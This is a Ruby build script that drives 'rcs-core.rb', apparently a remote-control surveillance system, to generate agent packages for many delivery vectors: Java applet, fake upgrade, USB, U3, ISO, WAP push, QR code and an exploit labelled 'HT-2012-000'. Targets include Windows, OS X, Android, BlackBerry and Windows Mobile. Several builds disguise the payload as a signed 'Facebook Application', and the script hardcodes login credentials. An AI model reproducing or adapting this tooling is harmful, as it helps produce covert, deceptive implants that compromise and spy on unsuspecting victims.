#!/usr/bin/env ruby
require 'json'
require 'fileutils'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
DB = 'rcs-castore'
PORT = 4444
DEMO = true

ver = DEMO ? '_demo' : ''

puts "Building all complex..."
###################################################################################################
params = {platform: 'anon',
          binary: {demo: DEMO},
          melt: {admin: true, port: 443}
          }
          
FileUtils.rm_rf("anon#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o anon#{ver}.zip"
###################################################################################################
params = {platform: 'applet',
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook'}
          }

FileUtils.rm_rf("applet#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o applet#{ver}.zip"
###################################################################################################
params = {platform: 'upgrade',
          generate: {platforms: ['windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook'}
          }

FileUtils.rm_rf("upgrade#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o upgrade#{ver}.zip"
###################################################################################################
params = {platform: 'card',
          generate: {platforms: ['winmo'],
                     binary: {demo: DEMO}
                    }
          }

FileUtils.rm_rf("card#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o card#{ver}.zip"
###################################################################################################
params = {platform: 'u3',
          generate: {platforms: ['windows'],
                     binary: {demo: DEMO},
                     melt: {admin: false}
                    }
          }

FileUtils.rm_rf("u3#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o u3#{ver}.zip"
###################################################################################################
params = {platform: 'iso',
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    }
          }

FileUtils.rm_rf("offline#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o offline#{ver}.zip"
###################################################################################################
params = {platform: 'usb',
          generate: {binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    }
          }

FileUtils.rm_rf("usb#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o usb#{ver}.zip"
###################################################################################################
params = {platform: 'wap',
          generate: {platforms: ['blackberry', 'android', 'winmo'],
                     binary: {demo: DEMO, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

FileUtils.rm_rf("wap#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
###################################################################################################
params = {platform: 'qrcode',
          generate: {platforms: ['blackberry'],
                     binary: {demo: DEMO, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'},
                     link: 'http://www.alor.it'
                    }
          }
FileUtils.rm_rf("qrcode#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o qrcode#{ver}.zip"
###################################################################################################
params = {platform: 'exploit',
          generate: {exploit: 'HT-2012-000',
                     platforms: ['osx', 'windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook',
                 url: 'http://download.me/'}
          }

FileUtils.rm_rf("exploit#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o exploit#{ver}.zip"
###################################################################################################
puts "End"
